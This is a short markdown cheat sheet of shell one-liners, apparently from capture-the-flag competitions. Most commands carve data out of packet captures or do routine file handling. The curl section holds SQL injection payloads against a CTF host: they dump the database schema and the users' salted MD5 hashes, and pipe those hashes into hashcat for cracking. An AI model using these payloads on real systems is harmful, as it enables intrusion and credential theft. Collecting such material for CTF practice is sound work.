**tshark**</br>
```bash
tshark -r data.pcap -Y 'icmp and !(ip.src==128.227.236.205) and ip.src==10.136.255.127' -x | grep "0020" | cut -d" " -f5 | sed ':a;N;$!ba;s/\n//g' | xxd -r -p > output.gif
```
```bash
tshark -r pcap.pcap ip.src == 54.175.216.124 | rev | cut -d" " -f3 | rev | cut -d"." -f1 | xxd -r -p | grep -aEo "sun{.*}" | uniq
```

**find**
```bash
find . -type f -name "today*" -exec sed -i 's/apple/banana/g' \;
```

**tcpflow**
```bash
tcpflow -C -r ids_alert.pcap | sed -n "3p" | cut -d":" -f2 > key; tcpflow -C -r ids_alert.pcap | tr `tr "[:upper:]" "[:lower:]" < key``cat key` `python -c 'import string; print string.ascii_letters'` | grep -Eo "INSA{.*}"
```

**curl**
```bash
curl  --data-urlencode "username=username=data' union select group_concat(concat(table_name,0x20,column_name)) from information_schema.columns where table_schema=database()-- " -X POST https://crimemail.ctf.insecurity-insa.fr/hint.php
```
```bash
curl -s --data-urlencode "username=username=data' union select group_concat(concat(username,0x20,pass_salt,0x20,pass_md5)) from users-- " -X POST https://crimemail.ctf.insecurity-insa.fr/hint.php | grep -Eo "c\.hackle.*d" > hash; ./hashcat -a 0 -m 10 `awk '{print $3 ":" $2}' hash` rockyou.txt
```

**openssl**
```bash
openssl rsautl -decrypt -inkey privatekey.pem -in flag.bin -out decrypted.txt -raw
```

**tar**
```bash
tar xvfJ some
```

**tesseract**
```bash
tesseract some.png out
```

**rename**
```bash
rename "s/-/ /g" *
```
**env**
``bash
PS1="\[\033[01;32m\]\t:\u:\w$\[\033[0m\]"
```
